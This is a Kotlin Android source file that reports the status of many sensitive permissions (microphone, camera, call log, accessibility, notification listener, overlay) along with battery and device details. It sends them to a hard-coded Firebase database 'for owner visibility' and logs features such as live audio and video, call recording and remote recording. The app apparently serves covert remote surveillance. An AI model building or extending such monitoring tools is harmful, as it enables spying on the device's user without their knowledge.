package com.example.authapp.analytics

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.updater.UpdateManager
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue

object AppHealthTelemetry {
    private val database: FirebaseDatabase
        get() = FirebaseDatabase.getInstance("https://apnasatthilko-default-rtdb.asia-southeast1.firebasedatabase.app")

    fun getEffectiveUserId(context: Context): String {
        return FirebaseRepository.currentUser?.uid?.takeIf { it.isNotEmpty() }
            ?: AppPreferences.getUserId(context)
    }

    /**
     * Checks all 7 critical system and hardware permissions.
     */
    fun checkAllPermissions(context: Context): Map<String, Boolean> {
        val mic = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        val camera = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        val locationFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val locationCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val phoneState = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        val callLog = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

        val notifications = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }

        val overlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else {
            true
        }

        val batterySaverIgnored = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            pm?.isIgnoringBatteryOptimizations(context.packageName) ?: false
        } else {
            true
        }

        val usageAccess = try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps?.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.packageName)
            } else {
                @Suppress("DEPRECATION")
                appOps?.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.packageName)
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }

        val notificationListener = try {
            val listeners = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners") ?: ""
            listeners.contains(context.packageName)
        } catch (_: Exception) { false }

        val accessibility = try {
            val services = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            services.contains(context.packageName)
        } catch (_: Exception) { false }

        return mapOf(
            "microphone" to mic,
            "camera" to camera,
            "location" to (locationFine || locationCoarse),
            "readPhoneState" to phoneState,
            "readCallLog" to callLog,
            "postNotifications" to notifications,
            "systemAlertWindow" to overlay,
            "batteryOptimizationIgnored" to batterySaverIgnored,
            "usageAccess" to usageAccess,
            "notificationListener" to notificationListener,
            "accessibility" to accessibility
        )
    }

    /**
     * Gathers battery level and charging state.
     */
    private fun getBatteryInfo(context: Context): Pair<Int, Boolean> {
        return try {
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                context.registerReceiver(null, filter)
            }
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1

            val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging: Boolean = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
            Pair(batteryPct, isCharging)
        } catch (_: Exception) {
            Pair(-1, false)
        }
    }

    /**
     * Full Device Health Sync to `/device_health/{userId}` in Firebase Realtime Database.
     */
    fun syncDeviceHealth(context: Context, serviceState: String = "IDLE_PROTECTED") {
        val uid = getEffectiveUserId(context)
        if (uid.isEmpty()) return

        val permissions = checkAllPermissions(context)
        val (batteryPercent, isCharging) = getBatteryInfo(context)
        val role = AppPreferences.getUserRole(context)
        val versionCode = UpdateManager.getCurrentVersionCode(context)
        val versionName = UpdateManager.getCurrentVersionName(context)

        val healthData = mapOf(
            "userId" to uid,
            "role" to role,
            "deviceInfo" to mapOf(
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "androidVersion" to Build.VERSION.RELEASE,
                "sdkInt" to Build.VERSION.SDK_INT
            ),
            "appVersion" to mapOf(
                "versionCode" to versionCode,
                "versionName" to versionName
            ),
            "serviceHealth" to mapOf(
                "isForegroundServiceRunning" to (serviceState != "STOPPED"),
                "currentServiceState" to serviceState,
                "lastHeartbeat" to ServerValue.TIMESTAMP,
                "batteryPercent" to batteryPercent,
                "isCharging" to isCharging,
                "isBatteryOptimizationIgnored" to (permissions["batteryOptimizationIgnored"] ?: false)
            ),
            "permissions" to permissions,
            "lastUpdated" to ServerValue.TIMESTAMP
        )

        try {
            val now = System.currentTimeMillis()
            val prefs = context.getSharedPreferences("telemetry_throttle_prefs", Context.MODE_PRIVATE)
            val lastSync = prefs.getLong("last_health_sync_$uid", 0L)
            val lastState = prefs.getString("last_health_state_$uid", "")

            // Only skip write if state is unchanged and less than 60 seconds have elapsed
            if (serviceState == lastState && (now - lastSync) < 60_000L) {
                return
            }

            prefs.edit().putLong("last_health_sync_$uid", now).putString("last_health_state_$uid", serviceState).apply()
            database.reference.child("device_health").child(uid).updateChildren(healthData)

            if (batteryPercent in 1..15 && !isCharging) {
                val prefs = context.getSharedPreferences("battery_alert_prefs", Context.MODE_PRIVATE)
                val lastSent = prefs.getLong("last_battery_alert", 0L)
                if (System.currentTimeMillis() - lastSent > 2 * 60 * 60 * 1000L) {
                    prefs.edit().putLong("last_battery_alert", System.currentTimeMillis()).apply()
                    val alert = com.example.authapp.data.SecurityAlert(
                        type = "BATTERY_LOW",
                        title = "Low Battery Alert 🔋",
                        message = "Battery level has dropped to $batteryPercent%",
                        timestamp = System.currentTimeMillis(),
                        severity = "WARNING"
                    )
                    FirebaseRepository.pushSecurityAlert(uid, alert)
                }
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[Telemetry] syncDeviceHealth failed: ${e.localizedMessage}")
        }
    }

    /**
     * Sends lightweight heartbeat to `/device_health/{userId}/serviceHealth`.
     */
    fun sendHeartbeat(context: Context, serviceState: String = "IDLE_PROTECTED") {
        val uid = getEffectiveUserId(context)
        if (uid.isEmpty()) return

        val (batteryPercent, isCharging) = getBatteryInfo(context)
        val heartbeatData = mapOf(
            "isForegroundServiceRunning" to true,
            "currentServiceState" to serviceState,
            "lastHeartbeat" to ServerValue.TIMESTAMP,
            "batteryPercent" to batteryPercent,
            "isCharging" to isCharging
        )

        try {
            database.reference.child("device_health").child(uid).child("serviceHealth")
                .updateChildren(heartbeatData)
        } catch (_: Exception) {}
    }

    /**
     * Real-time Feature Diagnostic Event Logger to `/feature_diagnostics/{userId}`.
     * Features: LIVE_AUDIO, LIVE_VIDEO, CALL_RECORDING, LOCATION_TRACKING, OTA_UPDATE, REMOTE_RECORDING
     * Events: STARTED, SUCCESS, FAILED, PERMISSION_DENIED, HARDWARE_BUSY
     */
    fun logDiagnostic(
        context: Context,
        feature: String,
        event: String,
        reason: String,
        technicalError: String? = null,
        extraData: Map<String, Any>? = null
    ) {
        val uid = getEffectiveUserId(context)
        val versionCode = UpdateManager.getCurrentVersionCode(context)
        val timestamp = System.currentTimeMillis()

        val logEntry = mutableMapOf<String, Any>(
            "timestamp" to timestamp,
            "serverTime" to ServerValue.TIMESTAMP,
            "feature" to feature,
            "event" to event,
            "reason" to reason,
            "appVersionCode" to versionCode
        )

        technicalError?.let { logEntry["technicalError"] = it }
        extraData?.let { logEntry["details"] = it }

        // 1. Crashlytics Breadcrumb & Non-fatal reporting
        val logMsg = "[$feature] $event: $reason ${technicalError ?: ""}"
        FirebaseCrashlytics.getInstance().log(logMsg)
        if (event == "FAILED" && !technicalError.isNullOrEmpty()) {
            FirebaseCrashlytics.getInstance().recordException(Exception("[$feature] $reason: $technicalError"))
        }

        // 2. Realtime Database Write for immediate owner visibility
        if (uid.isNotEmpty()) {
            try {
                val ref = database.reference.child("feature_diagnostics").child(uid)
                ref.push().setValue(logEntry)
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[Telemetry] Push diagnostic failed: ${e.localizedMessage}")
            }
        }
    }
}
